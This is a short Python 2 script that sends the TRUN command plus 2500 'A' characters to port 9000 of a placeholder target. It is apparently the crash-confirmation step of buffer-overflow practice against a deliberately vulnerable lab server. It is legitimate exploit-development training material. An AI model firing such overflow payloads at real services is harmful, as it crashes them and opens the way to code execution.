#!usr/bin/python

#vulnerable app: http://github.com/stephenbrads

import sys, socket

buff = "TRUN /.:/"

#sending 2500 "A" to verify crash

buff += "A" * 2500

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('Target ip',9000))

print s.recv(1024)

s.send(buff)

s.close()
